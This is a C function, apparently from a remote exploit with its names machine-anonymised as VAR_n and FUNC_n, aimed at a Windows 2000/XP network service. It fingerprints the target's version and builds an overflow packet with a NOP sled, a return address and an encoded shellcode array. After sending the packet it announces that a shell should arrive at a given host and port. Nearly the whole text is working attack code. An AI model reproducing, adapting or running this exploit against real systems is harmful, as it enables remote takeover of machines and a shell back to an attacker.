
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int shellc0de ;


 int VAR_0 ;
 int VAR_1 ;
 char* VAR_2 ;
 char* VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 int VAR_10 ;
 int VAR_11 ;
 int FUNC_0 (char*,char*,int) ;
 int FUNC_1 (char*,int,int) ;
 int FUNC_2 (char*,...) ;
 int FUNC_3 (int,char*,int,int ) ;
 int FUNC_4 (int,char*,int,int ) ;
 int FUNC_5 (int,int,char*,int,char*) ;
 int FUNC_6 (char*,int ) ;

int FUNC_7(int VAR_12, char *VAR_13, int VAR_14)
{
        int VAR_15,VAR_16=4,VAR_17,VAR_18;
        char VAR_19[VAR_4];
        char VAR_20[] =
        "\xeb\x02\xeb\x0f\x66\x81\xec\x04\x08\x8b\xec\x83\xec\x50\xe8\xef"
        "\xff\xff\xff\x5b\x80\xc3\x10\x33\xc9\x66\xb9\xba\x01\x80\x33\x95"
        "\x43\xe2\xfa\x7e\xfa\xa6\x4e\x26\xa5\xf1\x1e\x96\x1e\xd5\x99\x1e"
        "\xdd\x99\x1e\x54\x1e\xc9\xb1\x9d\x1e\xe5\xa5\x96\xe1\xb1\x91\xad"
        "\x8b\xe0\xdd\x1e\xd5\x8d\x1e\xcd\xa9\x96\x4d\x1e\xce\xed\x96\x4d"
        "\x1e\xe6\x89\x96\x65\xc3\x1e\xe6\xb1\x96\x65\xc3\x1e\xc6\xb5\x96"
        "\x45\x1e\xce\x8d\xde\x1e\xa1\x0f\x96\x65\x96\xe1\xb1\x81\x1e\xa3"
        "\xae\xe1\xb1\x8d\xe1\x93\xde\xb6\x4e\xe0\x7f\x56\xca\xa6\x5c\xf3"
        "\x1e\x99\xca\xca\x1e\xa9\x1a\x18\x91\x92\x56\x1e\x8d\x1e\x56\xae"
        "\x54\xe0\x34\x56\x16\x79\xd5\x1e\x79\x14\x79\xb5\x97\x95\x95\xfd"
        "\xec\xd0\xed\xd4\xff\x9f\xff\xde\xff\x95\x7d\xe3\x6a\x6a\x6a\xa6"
        "\x5c\x52\xd0\x69\xe2\xe6\xa7\xca\xf3\x52\xd0\x95\xa6\xa7\x1d\xd8"
        "\x97\x1e\x48\xf3\x16\x7e\x91\xc4\xc4\xc6\x6a\x45\x1c\xd0\x91\xfd"
        "\xe7\xf0\xe6\xe6\xff\x9f\xff\xde\xff\x95\x7d\xd3\x6a\x6a\x6a\x1e"
        "\xc8\x91\x1c\xc8\x12\x1c\xd0\x02\x52\xd0\x69\xc2\xc6\xd4\xc6\x52"
        "\xd0\x95\xfa\xf6\xfe\xf0\x52\xd0\x91\xe1\xd4\x95\x95\x1e\x58\xf3"
        "\x16\x7c\x91\xc4\xc6\x6a\x45\xa6\x4e\xc6\xc6\xc6\xc6\xff\x94\xff"
        "\x97\x6a\x45\x1c\xd0\x31\x52\xd0\x69\xf6\xfa\xfb\xfb\x52\xd0\x95"
        "\xf0\xf6\xe1\x95\x1e\x58\xf3\x16\x7c\x91\xc4\x6a\xe0\x12\x6a\xc0"
        "\x02\xa6\x4e\x26\x97\x1e\x40\xf3\x1c\x8f\x96\x46\xf3\x52\x97\x97"
        "\x0f\x96\x46\x52\x97\x55\x3d\x94\x94\xff\x85\xc0\x6a\xe0\x31\x6a"
        "\x45\xfd\xf0\xe6\xe6\xd4\xff\x9f\xff\xde\xff\x95\x7d\x51\x6b\x6a"
        "\x6a\xa6\x4e\x52\xd0\x39\xd1\x95\x95\x95\x1c\xc8\x25\x1c\xc8\x2d"
        "\x1c\xc8\x21\x1c\xc8\x29\x1c\xc8\x55\x1c\xc8\x51\x1c\xc8\x5d\x52"
        "\xd0\x4d\x94\x94\x95\x95\x1c\xc8\x49\x1c\xc8\x75\x1e\xd8\x31\x1c"
        "\xd8\x71\x1c\xd8\x7d\x1c\xd8\x79\x18\xd8\x65\xc4\x18\xd8\x39\xc4"
        "\xc6\xc6\xc6\xff\x94\xc6\xc6\xf3\x52\xd0\x69\xf6\xf8\xf3\x52\xd0"
        "\x6b\xf1\x95\x1d\xc8\x6a\x18\xc0\x69\xc7\xc6\x6a\x45\xfd\xed\xfc"
        "\xe1\xc1\xff\x94\xff\xde\xff\x95\x7d\xcd\x6b\x6a\x6a\x6a";

        VAR_15=FUNC_3(VAR_12,VAR_19,VAR_4,0);
        if(VAR_19[0]!=0x30||VAR_19[1]!=0x11) {
                FUNC_2("error: wrong data received\r\n");
                return -1;
                }
        VAR_19[28]=0x00;VAR_19[36]=0x01;
        FUNC_4(VAR_12,VAR_19,VAR_15,0);
        FUNC_1(VAR_19,0,VAR_4);
        FUNC_2("[+] Gathering %-30s     ...","information");
        for(VAR_15=0;VAR_15<4096;VAR_15+=FUNC_3(VAR_12,&VAR_19[VAR_15],VAR_4,0));

        if(VAR_19[0]!=0x10||VAR_19[1]!=0x27) {
                FUNC_2("error: wrong data received\r\n");
                return -1;
        }
        FUNC_2("Done\r\n");
        VAR_18=(unsigned int)VAR_19[37];
        FUNC_2("[i] Operating system : ");
        if(VAR_19[16]==0x28||VAR_19[17]==0x0a) {
        VAR_17=1;
        FUNC_2("WinXP");
        } else {
                FUNC_2("Win2000");
                VAR_17=0;
        }
        FUNC_2("\r\n[i] Service Pack     : %s\r\n",&VAR_19[37]);
        FUNC_2("[+] Setting shellc0de for this %-15s   ...","version");
        FUNC_5(VAR_17,VAR_18,VAR_13,VAR_14,VAR_20);

        FUNC_1(&VAR_19[2],0,VAR_4-2);
        FUNC_6(&VAR_19[175],VAR_11);
        FUNC_1(&VAR_19[416],0x90,180);
if(VAR_17==0)
        FUNC_0(&VAR_19[516],VAR_2,4);
else
        FUNC_0(&VAR_19[516],VAR_3,4);
        FUNC_0(&VAR_19[520],VAR_20,sizeof(VAR_20));
        FUNC_6(&VAR_19[1200],VAR_10);FUNC_6(&VAR_19[975],VAR_8);
        FUNC_6(&VAR_19[1295],VAR_5);FUNC_6(&VAR_19[1495],VAR_7);
        FUNC_6(&VAR_19[1755],VAR_6);FUNC_6(&VAR_19[2015],VAR_10);
        FUNC_6(&VAR_19[2275],VAR_1);FUNC_6(&VAR_19[2535],VAR_9);
        FUNC_6(&VAR_19[2795],VAR_0);
        FUNC_2("Done\r\n");
        FUNC_2("[+] Sending evil %-30s  ...","packet");
        FUNC_4(VAR_12,VAR_19,VAR_4,0);
        FUNC_1(VAR_19,0,VAR_4);
        VAR_15=FUNC_3(VAR_12,VAR_19,VAR_4,0);

        if(VAR_19[0]!=0x32||VAR_19[1]!=0x11) {
                FUNC_2("Patched\r\n");
                return -1;
        }
        FUNC_2("Done\r\n");
        FUNC_2("[i] Shell should be arrived at %s:%d\r\n",VAR_13,VAR_14);
        return 0;
}
